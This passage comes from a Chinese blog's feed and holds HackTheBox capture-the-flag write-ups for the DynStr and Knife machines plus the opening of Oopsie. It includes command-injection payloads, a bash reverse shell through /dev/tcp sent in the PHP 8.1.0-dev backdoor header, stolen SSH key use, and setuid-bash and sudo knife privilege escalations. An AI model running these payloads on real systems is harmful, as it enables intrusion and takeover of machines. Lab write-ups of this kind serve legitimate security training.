+<p>在搜索dynadns时，发现了<code>www.dynu.com</code>，这是一个免费提供动态DNS服务供应商,站内搜索badauth得到如下<a href="https://www.dynu.com/Forum/ViewTopic/badauth-being-received/439">帖子</a>，从问题回答者的回帖中发现<code>/nic/update</code>后面传了几个参数，应该就是通过参数的内容来判断<strong>badauth</strong>与否，开始我们获得了一个用户名、密码、邮箱等信息，但和文章中提到的参数还是有点初入，简单尝试发现还是行不通。</p>
+<p>又去搜<code>/nic/update</code>，找到了关于no-ip动态dns发送更新的一篇<a href="https://www.noip.com/integrate/request">说明</a></p>
+<p>一个基本的发送更新请求的样例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /nic/update?hostname=mytest.example.com&amp;myip=192.0.2.25 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: dynupdate.no-ip.com</span><br><span class="line"></span><br><span class="line">Authorization: Basic base64-encoded-auth-string</span><br><span class="line"></span><br><span class="line">User-Agent: Company DeviceName-Model/FirmwareVersionNumber maintainer-contact@example.com</span><br></pre></td></tr></table></figure>
+
+<p>其中<strong>Authorization</strong>的解释如下：</p>
+<blockquote>
+<p><strong>Authorization:</strong> base64-encoded-auth-string should be the <a href="http://en.wikipedia.org/wiki/Base64">base64 encoding </a>of username:password.</p>
+</blockquote>
+<p><strong>Authorization</strong>为base64加密的<strong>username:password</strong>，似乎上述所有参数我们都已经有了</p>
+<p>模仿示例直接用curl请求得到正确响应（当然可以用Burpsuite）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/good%E5%9B%9E%E6%98%BE.png" alt="good回显"></p>
+<p>在no-ip上找到了对各种相应的解释</p>
+<table>
+<thead>
+<tr>
+<th>Status</th>
+<th>Description</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>good IP_ADDRESS</td>
+<td>Success</td>
+<td>DNS hostname update successful. Followed by a space and the IP address it was updated to.  The IP address returned will be the IPv4 address, if an IPv4 is supplied. If IPv4 and IPv6 are both supplied, both ips will be returned in a comma separated list. If only an IPv6 address is supplied, an IPv6 address (only) will be returned.</td>
+</tr>
+<tr>
+<td>nochg IP_ADDRESS</td>
+<td>Success</td>
+<td>IP address is current, no update performed. Followed by a space and the IP address that it is currently set to.  The IP address returned will be the IPv4 address if an IPv4 is supplied. If IPv4 and IPv6 are both supplied, both ips will be returned in a comma separated list. If only an IPv6 address is supplied, an IPv6 address (only) will be returned.  Note: Excessive nochg responses may result in your client being blocked.</td>
+</tr>
+<tr>
+<td>nohost</td>
+<td>Error</td>
+<td>Hostname supplied does not exist under specified account, client exit and require user to enter new login credentials before performing an additional request.</td>
+</tr>
+<tr>
+<td>badauth</td>
+<td>Error</td>
+<td>Invalid username password combination.</td>
+</tr>
+<tr>
+<td>badagent</td>
+<td>Error</td>
+<td>Client disabled. Client should exit and not perform any more updates without user intervention.  Note: You must use the recommended User-Agent format specified when <a href="https://www.noip.com/integrate/request">Submitting</a> an Update, failure to follow the format guidelines may result in your client being blocked.</td>
+</tr>
+<tr>
+<td>!donator</td>
+<td>Error</td>
+<td>An update request was sent, including a feature that is not available to that particular user such as offline options.</td>
+</tr>
+<tr>
+<td>abuse</td>
+<td>Error</td>
+<td>Username is blocked due to abuse. Either for not following our update specifications or disabled due to violation of the No-IP terms of service. Our terms of service can be viewed <a href="https://www.noip.com/legal/tos">here</a>. Client should stop sending updates.</td>
+</tr>
+<tr>
+<td>911</td>
+<td>Error</td>
+<td>A fatal error on our side such as a database outage. Retry the update no sooner than 30 minutes.  A 500 HTTP error may also be returned in case of a fatal error on our system at which point you should also retry no sooner than 30 minutes.</td>
+</tr>
+</tbody></table>
+<p>得到一个成功的响应，但对继续深入好像没有什么大的帮助</p>
+<p>尝试对<code>myip</code>、<code>hostname</code>两个参数进行测试，输入<code>‘</code>、<code>；</code>、<code>：</code>等字符的时候报错了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nsupdate%E6%8A%A5%E9%94%99.png" alt="nsupdate报错"></p>
+<p>搜索<a href="https://linux.die.net/man/8/nsupdate">nsupdate</a>发现这是一个动态dns更新程序，既然报错了那么可以猜想Linux系统在执行这个程序时，传入了get到的几个参数，<code>hostname</code>传入一些错误输入会报错，那么这个参数传进去的内容也许可以利用一下(注意：这不是nsupdate本身报错)</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>（一万年以后）</p>
+<p>fuzz命令执行格式为``echo xxx|bash`，注意请求的时候还要进行一次url编码…</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`echo [base64加密payload]| base64 -d | bash`</span><br></pre></td></tr></table></figure>
+
+<p>nc收到nc收到弹回来的shell（这里可以升级一下shell）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E5%BC%B9shell.png" alt="弹shell"></p>
+<p>当前目录下发现了update的源码= =！！（这代码有问题，没问题也反弹不了shell…）</p>
+<p><strong>update</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// Check authentication</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))      &#123; <span class="keyword">echo</span> <span class="string">&quot;badauth\n&quot;</span>; <span class="keyword">exit</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>].<span class="string">&quot;:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]!==<span class="string">&#x27;dynadns:sndanyd&#x27;</span>) &#123; <span class="keyword">echo</span> <span class="string">&quot;badauth\n&quot;</span>; <span class="keyword">exit</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set $myip from GET, defaulting to REMOTE_ADDR</span></span><br><span class="line">  <span class="variable">$myip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$valid</span>=filter_var(<span class="variable">$_GET</span>[<span class="string">&#x27;myip&#x27;</span>],FILTER_VALIDATE_IP))                       &#123; <span class="variable">$myip</span> = <span class="variable">$valid</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hostname&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// Check for a valid domain</span></span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$h</span>,<span class="variable">$d</span>) = explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;hostname&#x27;</span>],<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$validds</span> = <span class="keyword">array</span>(<span class="string">&#x27;dnsalias.htb&#x27;</span>,<span class="string">&#x27;dynamicdns.htb&#x27;</span>,<span class="string">&#x27;no-ip.htb&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$d</span>,<span class="variable">$validds</span>)) &#123; <span class="keyword">echo</span> <span class="string">&quot;911 [wrngdom: <span class="subst">$d</span>]\n&quot;</span>; <span class="keyword">exit</span>; &#125;</span><br><span class="line">    <span class="comment">// Update DNS entry</span></span><br><span class="line">    <span class="variable">$cmd</span> = sprintf(<span class="string">&quot;server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n&quot;</span>,<span class="variable">$d</span>,<span class="variable">$h</span>,<span class="variable">$d</span>,<span class="variable">$h</span>,<span class="variable">$d</span>,<span class="variable">$myip</span>);</span><br><span class="line">    system(<span class="string">&#x27;echo &quot;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&quot; | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key&#x27;</span>,<span class="variable">$retval</span>);</span><br><span class="line">    <span class="comment">// Return good or 911</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$retval</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;good <span class="subst">$myip</span>\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;911 [nsupdate failed]\n&quot;</span>; <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nochg <span class="subst">$myip</span>\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过<code>/etc/password</code>发现服务器上的用户有<strong>root</strong>、<strong>dyna</strong>、<strong>bindmgr</strong>，在<strong>bindmgr</strong>的目录下发现了user.txt但是没权限</p>
+<p><strong>dyna</strong></p>
+<p>![home dyna](<a href="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/home">https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/home</a> dyna.png)</p>
+<p><strong>bindmgr</strong></p>
+<p>![home bindmgr](<a href="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/home">https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/home</a> bindmgr.png)</p>
+<p><strong>dyna</strong>目录下的 <code>.sudo_as_admin_successful</code>着实迷惑了我很久，做到后来发现确实没什么用，当然这是后话了</p>
+<p>在<strong>bindmgr</strong>下还有个support-case-C62796521目录，读取其中的strace-C62796521.txt出来一堆东西，似乎是一个类似运行记录的文件，其中找到了<strong>bindmgr</strong>的ssh密钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/log%E6%96%87%E4%BB%B6.png" alt="log文件"></p>
+<p>![get id_rsa](<a href="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/get">https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/get</a> id_rsa.png)</p>
+<p>连不上！？</p>
+<p>Google搜索：ddns ssh。其中<strong>Free Dynamic DNS for Remote Login via SSH</strong>启发了我，文中有段他说：选择一个域名添加当前的IP地址。那么我的ip应该不在靶机的dns域内，所以没法用ssh连接</p>
+<p>找到了一篇<a href="https://www.thegeekstuff.com/2014/01/install-dns-server/">如何在linux中安装和配置DNS服务器</a>，所有 DNS 配置都存储在 /etc/bind 目录下。主要配置是 /etc/bind/named.conf，它将包含其他需要的文件。靶机上确实存在<code>/etc/bind</code>目录（update源码里也有写到），而且其中存在<code>.key</code>为后缀的文件，上面<strong>nsupdate</strong>的使用方法写到过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nsupdate [ -d ] [ [ -y keyname:secret ] [ -k keyfile ] ] [ -v ] [ filename ]</span><br><span class="line">-d 调试模式</span><br><span class="line">-k 从keyfile文件中读取密钥信息</span><br><span class="line">-y keyname是密钥的名称，secret是base64编码的密钥</span><br><span class="line">-v 使用TCP协议进行nsupdate，默认UDP协议</span><br></pre></td></tr></table></figure>
+
+<p>keyfile就是指<code>.key</code>后缀的文件，那么思路清晰了，我们可以通过nsupdate来更新DNS区域</p>
+<h3 id="什么是DNS区域"><a href="#什么是DNS区域" class="headerlink" title="什么是DNS区域"></a><a href="https://www.cloudflare.com/zh-cn/learning/dns/glossary/dns-zone/">什么是DNS区域</a></h3><blockquote>
+<p>DNS 被分成许多不同的区域。这些区域区分 DNS 命名空间中不同管理的区域。 DNS 区域是由特定组织或管理员管理的 DNS 命名空间的一部分。 DNS 区域是一个管理空间，允许对 DNS 组件（例如权威名称服务器）进行更精细的控制。域名空间是一棵分层树，DNS 根域位于顶部。 DNS 区域从树中的一个域开始，也可以向下扩展到子域，以便一个实体可以管理多个子域。</p>
+</blockquote>
+<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p><strong>nsupdate的示例</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nsupdate示例:</span><br><span class="line">&gt; server 127.0.0.1 //发送请求到指定服务器，不指定就默认发给当当前去的主DNS服务器</span><br><span class="line">&gt; update delete www.test.com A //删除资源记录</span><br><span class="line">&gt;</span><br><span class="line">&gt; update add www.test.cn 80000 IN A 192.168.0.2 //添加一条资源记录</span><br><span class="line">&gt; update add 2.0.168.192.in-addr.arpa 80000 PTR A www.test.com</span><br><span class="line">&gt; send //一个空行或者一个send命令，会将先前输入的命令发送到DNS服务器上</span><br><span class="line">&gt; quit //退出</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用上面<strong>update</strong>中使用的ddns.key，尝试添加记录的时候被拒绝了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nsupdate1.png" alt="nsupdate1"></p>
+<p>还有个infra.key，添加记录应该是成功了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nsupdate2.png" alt="nsupdate2"></p>
+<p>用SSH连接成功，得到user.txt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/usertxt.png" alt="usertxt"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo -l发现一个可执行文件<strong>bindmgr.sh</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/sudo-l.png" alt="sudo-l"></p>
+<p>查看一下脚本是用来干嘛的</p>
+<p><strong>bindmgr.sh</strong></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This script generates named.conf.bindmgr to workaround the problem</span></span><br><span class="line"><span class="comment"># that bind/named can only include single files but no directories.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span></span><br><span class="line"><span class="comment"># from named.conf.local (or others) and will include all files from the</span></span><br><span class="line"><span class="comment"># directory /etc/bin/named.bindmgr.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> The script is work in progress. For now bind is not including</span></span><br><span class="line"><span class="comment">#       named.conf.bindmgr. </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Currently the script is only adding files to the directory but</span></span><br><span class="line"><span class="comment">#       not deleting them. As we generate the list of files to be included</span></span><br><span class="line"><span class="comment">#       from the source directory they won&#x27;t be included anyway.</span></span><br><span class="line"></span><br><span class="line">BINDMGR_CONF=/etc/<span class="built_in">bind</span>/named.conf.bindmgr</span><br><span class="line">BINDMGR_DIR=/etc/<span class="built_in">bind</span>/named.bindmgr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">indent</span></span>() &#123; sed <span class="string">&#x27;s/^/    /&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check versioning (.version)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Running <span class="variable">$0</span> to stage new configuration from <span class="variable">$PWD</span>.&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ ! -f .version ]] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 42</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;`cat .version 2&gt;/dev/null`&quot;</span> -le <span class="string">&quot;`cat <span class="variable">$BINDMGR_DIR</span>/.version 2&gt;/dev/null`&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 43</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create config file that includes all files from named.bindmgr.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Creating <span class="variable">$BINDMGR_CONF</span> file.&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;// Automatically generated file. Do not modify manually.\n&#x27;</span> &gt; <span class="variable">$BINDMGR_CONF</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> * ; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;include &quot;/etc/bind/named.bindmgr/%s&quot;;\n&#x27;</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span> &gt;&gt; <span class="variable">$BINDMGR_CONF</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage new version of configuration files.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Staging files to <span class="variable">$BINDMGR_DIR</span>.&quot;</span></span><br><span class="line">cp .version * /etc/<span class="built_in">bind</span>/named.bindmgr/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check generated configuration with named-checkconf.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Checking staged configuration.&quot;</span></span><br><span class="line">named-checkconf <span class="variable">$BINDMGR_CONF</span> &gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [[ $? -ne 0 ]] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: The generated configuration is not valid. Please fix following errors: &quot;</span></span><br><span class="line">    named-checkconf <span class="variable">$BINDMGR_CONF</span> 2&gt;&amp;1 | indent</span><br><span class="line">    <span class="built_in">exit</span> 44</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[+] Configuration successfully staged.&quot;</span></span><br><span class="line">    <span class="comment"># *** TODO *** Uncomment restart once we are live.</span></span><br><span class="line">    <span class="comment"># systemctl restart bind9</span></span><br><span class="line">    <span class="keyword">if</span> [[ $? -ne 0 ]] ; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[-] Restart of bind9 via systemctl failed. Please check logfile: &quot;</span></span><br><span class="line">        systemctl status bind9</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[+] Restart of bind9 via systemctl succeeded.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分开来看这个脚本的功能</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Check versioning (.version)<span class="built_in">echo</span> <span class="string">&quot;[+] Running <span class="variable">$0</span> to stage new configuration from <span class="variable">$PWD</span>.&quot;</span><span class="keyword">if</span> [[ ! -f .version ]] ; <span class="keyword">then</span>    <span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span>    <span class="built_in">exit</span> 42fiif [[ <span class="string">&quot;`cat .version 2&gt;/dev/null`&quot;</span> -le <span class="string">&quot;`cat <span class="variable">$BINDMGR_DIR</span>/.version 2&gt;/dev/null`&quot;</span> ]] ; <span class="keyword">then</span>    <span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span>    <span class="built_in">exit</span> 43fi</span></span><br></pre></td></tr></table></figure>
+
+<p>检查版本，会检查<code>.version</code>文件是否存在，不存在则报错退出</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create config file that includes all files from named.bindmgr.echo &quot;[+] Creating $BINDMGR_CONF file.&quot;printf &#x27;// Automatically generated file. Do not modify manually.\n&#x27; &gt; $BINDMGR_CONFfor file in * ; do    printf &#x27;include &quot;/etc/bind/named.bindmgr/%s&quot;;\n&#x27; &quot;$file&quot; &gt;&gt; $BINDMGR_CONFdone# Stage new version of configuration files.echo &quot;[+] Staging files to $BINDMGR_DIR.&quot;cp .version * /etc/bind/named.bindmgr/</span></span><br></pre></td></tr></table></figure>
+
+<p>如果<code>.version</code>文件存在，则创建<code>$BINDMGR_CONF</code>文件，并把在.version同一目录下的所有文件都拷贝到<code>$BINDMGR_DIR</code>。（注意：cp命令用了通配符）</p>
+<p>本地没有vim但是有nano，用nano创建一个<code>.version文件</code>随便输入什么版本并执行脚本，到<code>/etc/bind/named.bindmgr</code>目录发现<code>.version</code>文件确实被拷贝进来了而且为root所用拥有</p>
+<p>![test sh](<a href="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/test">https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/test</a> sh.png)</p>
+<p>![exec sh](<a href="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/exec">https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/exec</a> sh.png)</p>
+<p>如果复制一个<code>bash</code>到<code>.version</code>同一目录，权限设置为setuid并运行脚本，bash被复制后为root所拥有，似乎就能获得root的shell了，尝试一下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/sh%E5%89%8Dbash.png" alt="sh前bash"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/sh%E5%90%8Ebash.png" alt="sh后bash"></p>
+<p>bash虽然被复制了但是s权限没有了，这个问题由于通配符的存在（bindmgr.sh）可以解决，可以参考一下这篇文章<a href="https://www.freebuf.com/articles/system/176255.html">利用通配符进行Linux本地提权</a></p>
+<blockquote>
+<p>当Shell在“参数值”中遇到了通配符时，Shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换（路径扩展）；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符实际上就是一种Shell实现的路径扩展功能。在通配符被处理后，Shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。</p>
+</blockquote>
+<p><code>cp --help</code>看看有没有能用来保留s权限的参数，-p参数</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cp-p.png" alt="cp-p"></p>
+<blockquote>
+<p>-p：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。</p>
+</blockquote>
+<p>那么我们建一个<code>--preserve=mode</code>再运行脚本试试</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E4%BF%9D%E7%95%99mode.png" alt="保留mode"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Sbash.png" alt="Sbash"></p>
+<p>成功保留了s权限，可以得到root了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getroot.png" alt="getroot"></p>
+<p>end</p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Knife</title>
+    <url>/2022/01/07/HackTheBox-Knife/</url>
+    <content><![CDATA[<h1 id="Hackthebox-Knife"><a href="#Hackthebox-Knife" class="headerlink" title="Hackthebox-Knife"></a>Hackthebox-Knife</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pwned.png" alt="Pwned"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.6</p>
+<p>目标IP：10.10.10.242</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Knife_nmap.png" alt="nmap"></p>
+<p>开放了22和80端口，直接访问看看网站功能</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/web.png" alt="web"></p>
+<p>上面导航栏是假的根本点不了，<code>ctrl+u</code>查看网页源代码，似乎就当前页面</p>
+<p><strong>Dirsearch</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirsearch.png" alt="dirsearch"></p>
+<p>访问<code>../login</code>，和<code>index.php</code>一模一样</p>
+<h2 id="发现漏洞（PHP8-1-0-dev开发版本后门）"><a href="#发现漏洞（PHP8-1-0-dev开发版本后门）" class="headerlink" title="发现漏洞（PHP8.1.0-dev开发版本后门）"></a>发现漏洞（PHP8.1.0-dev开发版本后门）</h2><p><strong>Burpsuite</strong></p>
+<p>发现请求头有问题</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/head.png" alt="head"></p>
+<p><code>PHP/8.1.0-dev backdoor rce</code>在某场CTF比赛里碰到过</p>
+<p>攻击者可以通过发送<code>User-Agentt</code>头来执行任意代码（具体网上都能查到）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/PHP810backdoor.png" alt="PHP810backdoor"></p>
+<h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><p>添加请求头<code>User-Agentt: zerodiumsystem(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/2333 0&gt;&amp;1&#39;&quot;);</code></p>
+<p>监听2333端口成功反弹shell</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getshell.png" alt="getshell"></p>
+<p>在james用户主目录得到<code>user flag</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag.png" alt="userflag"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看james用户的sudo权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jamessudo.png" alt="jamessudo"></p>
+<p>可以无密码运行<code>/usr/bin/knife</code></p>
+<p>Google上搜一下<strong>Knife</strong> ，发现是一个命令行工具</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/aboutKnife.png" alt="aboutKnife"></p>
+<p><code>sudo knife</code>运行可以看到Knife的各种命令参数</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/knife.png" alt="knife"></p>
+<p>其中有一个exec 我们似乎可以利用</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/knifeexec.png" alt="knifeexec"></p>
+<p>看一下用法</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/useexec.png" alt="useexec"></p>
+<blockquote>
+<p>Knife exec有两个参数</p>
+<p>-E CODE<code>, </code>–exec CODE</p>
+<p>A string of code to be executed.</p>
+<p>-p PATH:PATH<code>, </code>–script-path PATH:PATH</p>
+<p>A colon-separated path at which Ruby scripts are located. Use to override the default location for scripts. When this option is not specified, knife will look for scripts located in <code>chef-repo/.chef/scripts</code> directory.</p>
+</blockquote>
+<p>用 Ruby 代码执行 shell 脚本的方式放在参考链接第二个了，<code>system</code>的用法其实没啥区别</p>
+<p>接下来可以提权了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo knife exec -E &quot;system(&#x27;/bin/sh -i&#x27;)&quot; //-i：实现脚本交互</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们已经拿到root的权限了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root.png" alt="root"></p>
+<p>注意，如果shell没有升级情况如下，升级一下就行（另一台靶机记录里写过，姿势很多）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/error.png" alt="error"></p>
+<p>接下来可以去找root的flag了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag.png" alt="rootflag"></p>
+<p>end</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>最近渗透靶机做的多了，对整个流程也熟悉了起来，由于漏洞点比赛碰到过可能没怎么卡壳</p>
+<p>本台靶机对我来说难点还是在提权吧，提权的方法和知识还是需要多多学习</p>
+<p>Google搜索信息也是解题不可分割的一环，碰到没见过的东西要现学现用</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.chef.io/workstation/knife/">https://docs.chef.io/workstation/knife/</a></p>
+<p><a href="http://thelazylog.com/executing-shell-script-from-ruby-code/">http://thelazylog.com/executing-shell-script-from-ruby-code/</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Oopsie</title>
+    <url>/2022/01/07/HackTheBox-Oopsie/</url>
+    <content><![CDATA[<h1 id="Hackthebox-Oopsie"><a href="#Hackthebox-Oopsie" class="headerlink" title="Hackthebox-Oopsie"></a>Hackthebox-Oopsie</h1><span id="more"></span>
+
+<blockquote>
+<p>目标IP：10.10.10.28</p>
+<p>本机IP：10.10.16.38</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/nmap-Oopsie.png" alt="nmap-Oopsie"></p>
